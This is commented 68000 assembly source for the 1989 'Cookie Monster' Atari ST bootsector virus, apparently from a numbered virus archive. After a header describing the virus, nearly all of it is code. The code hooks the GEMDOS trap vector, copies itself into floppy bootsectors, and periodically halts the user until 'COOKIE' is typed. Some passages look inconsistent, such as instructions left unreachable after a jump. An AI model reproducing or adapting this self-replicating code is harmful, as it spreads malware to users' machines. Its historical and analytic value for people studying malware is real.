; Virus #32
; Name: Cookie Monster Virus A.
; Type: Memory-resident bootsector virus.
; Discovery date: December 28th 1989.
; Virus can copy to drive(s): A.
; Virus attaches itself to: GEMDOS trap vector.
; Disks can be immunized against it: No.
; What can happen: Writes "YOU KNOW WHAT? I WANT A COOKIE!" on the screen, and then waits for the user to type COOKIE. After having done this, it will enable the user to continue whatever he was doing.
; When does that happen: After 30 copies of itself are made, then after each 20th copy.
; Reset-proof: No.
; Can copy to hard disk: No. 
 
 TEXT 

TRAP_1              equ $84       ; Trap #1 (GemDOS)                                                |SD
RAM_LOCATION        equ $140      ; free user vetor space
FLOPPY_BUF          equ $4000
TRAP_VECTOR_ADDR    equ $172  
TOS_MEMINIT         equ $FC0084        ; TOS 1.0 diagnostics cart check routine
BOOTSECTOR_START    equ $601C

Start:
        LEA       COUNTER(PC),A0                ; A0 = ptr to relocated counter 
        MOVE.B    #$1E,(A0)                     ; set counter == 30
        LEA       GO_TO_ORIGINAL_VECTOR(PC),A0  ; A0 = JMP instruction         
        MOVE.L    TRAP_1.L,2(A0)                ; patch address to TRAP_1 vector

        ; copy virus in RAM
        LEA       Start(PC),A0                  ; A0 = ptr to relocated Start
        MOVEQ     #$7F,D0                       ; for D0 = 127 to 0 (512 bytes)
        MOVEA.L   #RAM_LOCATION,A1              ; A1 = $140
.copy:  MOVE.L    (A0)+,(A1)+                   ; copy virus to $140
        DBF       D0,.copy

        ; Set Trap 1 Gemdos Trap Instruction Vectors
        MOVE.L    #TRAP_VECTOR_ADDR,TRAP_1.L    ; Set Trap 1 vector to $172
        RTS 

TRAP_VECTOR:                                    ; located at $172 (TRAP_VECTOR_ADDR)
        MOVE.L    #TRAP_VECTOR_ADDR,TRAP_1.L    ; Reset TRAP_VECTOR_ADDR
        JMP       TOS_MEMINIT                   ; jump to TOS 1.x meminit entry point (https://github.com/th-otto/tos1x/blob/master/bios/startup.S#L248C1-L248C8)
        
        MOVEM.L   A0-A1/D0,-(sp)                
        MOVE.W    12(sp),D0                     ; D0 = 
        ANDI.W    #$2000,D0 
        BEQ       L0002 
        MOVEA.L   sp,A0 
        LEA       18(A0),A0 
        BRA       L0003 
L0002:  MOVE      USP,A0
L0003:  MOVE.W    (A0),D0 
        CMP.W     #$4E,D0 
        BEQ       L0004 
        CMP.W     #$3D,D0 
        BNE       NOTHING_TO_DO 

        ; read boosector
L0004:  MOVE.W    #1,-(sp)                      ; count = 1 
        CLR.W     -(sp)                         ; side = 0
        CLR.W     -(sp)                         ; track = 0
        MOVE.W    #1,-(sp)                      ; sector = 1
        CLR.W     -(sp)                         ; dev = A
        CLR.L     -(sp)                         ; rsrvd = 0
        MOVE.L    #FLOPPY_BUF,-(sp)             ; buf = $4000 (FLOPPY_BUF)
        MOVE.W    #8,-(sp) 	                ; FLOPRD 
        TRAP      #$E                   
        LEA       20(sp),sp                     ; fix stack
        TST.L     D0                            ; check read status
        BNE       NOTHING_TO_DO 
        MOVEA.L   #FLOPPY_BUF,A0                ; A0 = FLOPPY_BUF
        MOVE.W    #BOOTSECTOR_START,(A0)        ; Add branch at start
        LEA       30(A0),A0                     ; advance of $1C+2 = $1E (30)
        MOVEA.L   #RAM_LOCATION,A1              ; A1 = virus ram location
        MOVE.W    #$77,D0                       ; For D0 = 119 to 0
.copy:  MOVE.L    (A1)+,(A0)+                   ; copy virus to buffer for 480 bytes
        DBF       D0,.copy

        ; create executable bootsector
        MOVE.W    #1,-(sp)                      ; execflag = 1 (executable)
        MOVE.W    #$FFFF,-(sp)                  ; disktype = unchanged (-1)
        MOVE.L    #$FFFFFFFF,-(sp)              ; serial = 0xFFFFFFFF
        MOVE.L    #FLOPPY_BUF,-(sp)             ; buf = FLOPPY_BUF
        MOVE.W    #$12,-(sp) 	                ; void protobt(long buffer, long serialno, int disktype, int execflag)
        TRAP      #$E 
        LEA       14(sp),sp                     ; fix stack
      
        ; write bootsector
        MOVE.W    #1,-(sp)                      ; count = 1 
        CLR.W     -(sp)                         ; side = 0
        CLR.W     -(sp)                         ; track = 0
        MOVE.W    #1,-(sp)                      ; sector = 1
        CLR.W     -(sp)                         ; dev = A
        CLR.L     -(sp)                         ; rsrvd = 0
        MOVE.L    #FLOPPY_BUF,-(sp)             ; buf = $4000 (FLOPPY_BUF)
        MOVE.W    #9,-(sp) 	                ; FLOPWR 
        TRAP      #$E 
        LEA       20(sp),sp                     ; fix stack

        LEA       COUNTER(PC),A0                ; A0 = counter
        SUBI.B    #1,(A0)                       ; decrement counter (started at 30)
        BEQ       PRINT_LINE1                   ; if 0, print line!
NOTHING_TO_DO:  
        MOVEM.L   (sp)+,A0-A1/D0
GO_TO_ORIGINAL_VECTOR:
        JMP       0.L                            ; will be patched by default TRAP 1 vector

PRINT_LINE1:
        MOVE.B    #$14,(A0)                     ; reset counter t0 20
        MOVEM.L   A3/D3,-(sp)                   ; 
        LEA       MESSAGE1(PC),A0               ; 
        MOVE.L    A0,-(sp)                      ; str = MESSAGE1 addr
        MOVE.W    #9,-(sp) 	                ; VOID Cconws( str ) 
        TRAP      #1
        ADDQ.W    #6,sp                         ; fix stack

PRINT_LINE2:
        LEA       MESSAGE2(PC),A0               ; 
        MOVE.L    A0,-(sp)                      ; str = MESSAGE2 addr
        MOVE.W    #9,-(sp) 	                ; VOID Cconws( str ) 
        TRAP      #1
        ADDQ.W    #6,sp                         ; fix stack
        LEA       PASSWORD(PC),A3               ; A3 = PASSWORD addr
        MOVE.W    #5,D3                         ; d3 = 5 = password length

WAIT_ANSWER:
        MOVE.W    #1,-(sp) 	                ; LONG Cconin( VOID ) Cconin() reads a character (waiting until one is available) 
        TRAP      #1
        ADDQ.W    #2,sp                         ; fix stack
        CMP.B     #$61,D0 	                ; if key >= 'a' typed
        BGE       .upper_ascii                         
.again:  
        CMP.B     (A3)+,D0                      ; compare character with PASSWORD character position
        BNE.S     PRINT_LINE2                   ; go back if different
        DBF       D3,WAIT_ANSWER                ; decrease password len, if done leave
        MOVEM.L   (sp)+,A3/D3 
        BRA.S     NOTHING_TO_DO 
.upper_ascii:  
        CMP.B     #$7A,D0 	                ; if key > 'z' typed
        BGT.S     .again                        ; go back to print
        BCLR      #5,D0                         ; else Test Bit and Clear it on d0 ???
        BRA.S     .again                        ; go back

MESSAGE2:
        DC.B      $0A,$0D,'I WANT A ' 
PASSWORD:  
        DC.B      'COOKIE! ',$0D
        DC.B      $0A,$00 
COUNTER:DC.B      $00 
MESSAGE1:
        DC.B      $1B,'EYOU KNOW WHAT?,'
USELESS:
        DCB.W     45,0
        DC.B      '7',$12,$F9,$FF,$FF,$00 
ZUEND: END
